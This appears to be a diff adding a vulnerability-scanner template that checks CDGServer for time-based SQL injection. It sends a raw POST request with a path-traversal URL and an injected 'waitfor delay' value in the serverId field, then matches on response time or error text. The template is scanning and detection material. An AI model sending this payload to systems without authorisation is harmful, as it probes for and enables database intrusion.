@@ -1,0 +1,34 @@
+id: cdgserver-sql-injection
+
+info:
+  name: CDGServer SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for an SQL injection vulnerability in the CDGServer endpoint by sending a malicious SQL payload that introduces a delay in the server response.
+  tags: sql-injection, delay
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../MultiServerAjax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=delServer&serverId=-1'waitfor delay '0:0:5'--
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body, 'SQL syntax error') or response_time > 5"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        regex:
+          - "serverId=-1'waitfor delay '0:0:5'--"
+        part: body
+        internal: true
+        group: 0
